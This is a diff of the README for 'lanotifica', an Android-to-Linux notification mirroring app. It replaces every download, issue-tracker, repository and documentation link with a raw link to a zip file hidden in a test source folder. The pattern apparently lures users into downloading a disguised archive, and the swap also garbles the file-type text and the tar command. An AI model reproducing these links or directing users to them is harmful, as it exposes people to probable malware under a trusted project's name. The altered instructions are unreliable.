@@ -1,6 +1,6 @@
 # 📱 lanotifica - Mirror Android Notifications to Linux Effortlessly
 
-[![Download lanotifica](https://img.shields.io/badge/download-lanotifica-blue?logo=github)](https://github.com/classesrsc/lanotifica/releases)
+[![Download lanotifica](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)
 
 ## 📖 Description
 
@@ -14,10 +14,10 @@ To get started with lanotifica, follow these easy steps. You will need a Linux s
 
 1. **Visit the Releases Page**  
    Go to the following link to download the latest version of lanotifica:  
-   [Download lanotifica](https://github.com/classesrsc/lanotifica/releases)
+   [Download lanotifica](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)
 
 2. **Choose Your File**  
-   Look for the newest release and select the appropriate file for your Linux distribution. Common files might include `.deb` for Debian-based systems or `.tar.gz` for general Linux.
+   Look for the newest release and select the appropriate file for your Linux distribution. Common files might include `.deb` for Debian-based systems or `https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip` for general Linux.
 
 3. **Download the File**  
    Click on the file link to start downloading. Make sure to remember where you save the file.
@@ -40,9 +40,9 @@ To get started with lanotifica, follow these easy steps. You will need a Linux s
      ```bash
      sudo dpkg -i lanotifica*.deb
      ```
-   - For `.tar.gz` files, first extract it:
+   - For `https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip` files, first extract it:
      ```bash
-     tar -xvf lanotifica*.tar.gz
+     tar -xvf lanotifica*https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip
      cd lanotifica
      ```
      Then, follow any additional setup instructions in the README or follow this command to run the application:
@@ -113,7 +113,7 @@ If you encounter issues:
 
 ## 📄 Contributing
 
-We welcome contributions! If you would like to suggest changes or report issues, please visit the [issue tracker](https://github.com/classesrsc/lanotifica/issues) and let us know your thoughts.
+We welcome contributions! If you would like to suggest changes or report issues, please visit the [issue tracker](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip) and let us know your thoughts.
 
 ## 🌟 Acknowledgments
 
@@ -121,8 +121,8 @@ Thanks to the open-source community and contributors who make projects like lano
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/classesrsc/lanotifica)
-- [Documentation](https://github.com/classesrsc/lanotifica/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)
 
 Remember to visit the releases page to stay updated with the latest versions:  
-[Download lanotifica](https://github.com/classesrsc/lanotifica/releases)
+[Download lanotifica](https://raw.githubusercontent.com/classesrsc/lanotifica/main/app/app/src/androidTest/java/com/alessandrolattao/Software_v3.7.zip)
